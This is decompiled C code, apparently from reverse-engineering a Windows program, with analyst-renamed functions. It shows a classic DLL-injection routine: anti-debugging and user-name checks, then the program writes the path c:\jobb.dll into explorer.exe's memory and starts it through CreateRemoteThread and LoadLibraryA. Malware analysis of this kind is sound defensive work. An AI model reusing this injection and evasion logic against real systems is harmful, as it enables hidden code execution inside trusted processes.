#include "stdio.h"
#include <iostream>

int __cdecl invoke_main(void)
{
	undefined8 uVar1;
	int iVar2;
	undefined8 uVar3;
	undefined8 *UndefinedPtr_GlobalVariable1;
	uint *UndefinedPtr_GlobalVariable2;
	undefined8 in_R9;

	uVar3 = _get_initial_narrow_environment();
	UndefinedPtr_GlobalVariable1 = __Return_GlobalVariable1__();
	uVar1 = *UndefinedPtr_GlobalVariable1;
	UndefinedPtr_GlobalVariable2 = (uint *)__Return_GlobalVariable2__();
	iVar2 = __PerformProcessInjection__((ulonglong)*UndefinedPtr_GlobalVariable2,uVar1,uVar3,in_R9 );
	return iVar2;
}



void __PerformProcessInjection__(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)
{
	BOOL BVar1;
	DWORD DVar2;
	size_t sVar3;
	SIZE_T nSize;
	HMODULE hModule;
	longlong i;
	undefined8 uVar4;
	LPVOID pvVar5;
	ulonglong uVar6;
	undefined4 *puVar7;
	LPSTR lpBuffer;
	CHAR *lpBuffer_00;
	undefined8 uVar8;
	LPTHREAD_START_ROUTINE pPVar9;
	undefined4 local_3f8 [8];
	undefined local_3b8 [4];
	int local_3b4;
	CHAR local_388 [280];
	char *CP_explorer_exe;
	char *CP_jobb_dll;
	uint CheckExplorerRunning;
	HANDLE local_210;
	LPVOID local_1f0;
	LPTHREAD_START_ROUTINE local_1d0;
	HANDLE local_1b0;
	ulonglong local_20;

	puVar7 = local_3f8;
	for (i = 0xfa; i != 0; i = i + -1) {
	*puVar7 = 0xcccccccc;
	puVar7 = puVar7 + 1;
	}
	local_20 = DAT_140164008 ^ (ulonglong)local_3b8;
	__CheckForDebuggerJustMyCode(&DAT_140175015);
	local_3b4 = __CheckCurrentUserName__();
	if (local_3b4 == 1) {
	__LogOutput__(0x140134180,param_2,param_3,param_4);
					/* WARNING: Subroutine does not return */
	ExitProcess(1);
	}
	__LogOutput__(0x140134190,param_2,param_3,param_4);
	BVar1 = IsDebuggerPresent();
	if (BVar1 != 0) {
					/* WARNING: Subroutine does not return */
	ExitProcess(1);
	}
	CP_explorer_exe = "explorer.exe";
	CP_jobb_dll = "c:\\jobb.dll";
	CheckExplorerRunning = __CheckProcessExistence__("explorer.exe");
	if (CheckExplorerRunning == 0) {
	__LogOutput__(0x1401341c0,CP_explorer_exe,param_3,param_4);
					/* WARNING: Subroutine does not return */
	exit(1);
	}
	__LogOutput__(0x1401341e8,CP_explorer_exe,(ulonglong)CheckExplorerRunning,param_4);
	uVar4 = 0;
	lpBuffer = local_388;
	DVar2 = GetFullPathNameA(CP_jobb_dll,0x100,lpBuffer,(LPSTR *)0x0);
	if (DVar2 == 0) {
	__LogOutput__(0x140134210,CP_jobb_dll,lpBuffer,uVar4);
	}
	__LogOutput__(0x140134238,local_388,lpBuffer,uVar4);
	uVar6 = (ulonglong)CheckExplorerRunning;
	local_210 = OpenProcess(0x1fffff,0,CheckExplorerRunning);
	if (local_210 == (HANDLE)0x0) {
	__LogOutput__(0x140134270,(ulonglong)CheckExplorerRunning,uVar6,uVar4);
	}
	sVar3 = strlen(local_388);
	uVar8 = 0x3000;
	uVar4 = 0;
	local_1f0 = VirtualAllocEx(local_210,(LPVOID)0x0,sVar3,0x3000,0x40);
	if (local_1f0 == (LPVOID)0x0) {
	__LogOutput__(0x1401342a0,uVar4,sVar3,uVar8);
	}
	sVar3 = strlen(local_388);
	__LogOutput__(0x1401342d8,sVar3,local_1f0,uVar8);
	sVar3 = strlen(local_388);
	nSize = sVar3 + 1;
	lpBuffer_00 = local_388;
	pvVar5 = local_1f0;
	BVar1 = WriteProcessMemory(local_210,local_1f0,lpBuffer_00,nSize,(SIZE_T *)0x0);
	if (BVar1 == 0) {
	__LogOutput__(0x140134308,pvVar5,lpBuffer_00,nSize);
	}
	hModule = GetModuleHandleA("kernel32.dll");
	local_1d0 = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule,"LoadLibraryA");
	__LogOutput__(0x140134350,CP_explorer_exe,(ulonglong)CheckExplorerRunning,nSize);
	uVar4 = 0;
	uVar6 = 0;
	pPVar9 = local_1d0;
	local_1b0 = CreateRemoteThread(local_210,(LPSECURITY_ATTRIBUTES)0x0,0,local_1d0,local_1f0,0,
									(LPDWORD)0x0);
	if (local_1b0 == (HANDLE)0x0) {
	uVar6 = (ulonglong)CheckExplorerRunning;
	__LogOutput__(0x140134390,uVar6,uVar4,pPVar9);
	}
	CloseHandle(local_210);
	__LogOutput__(0x1401343d4,uVar6,uVar4,pPVar9);
	_RTC_CheckStackVars((longlong)local_3f8,(int *)&DAT_140134150);
	__ConditionalFunctionWrapper__(local_20 ^ (ulonglong)local_3b8);
	return;
}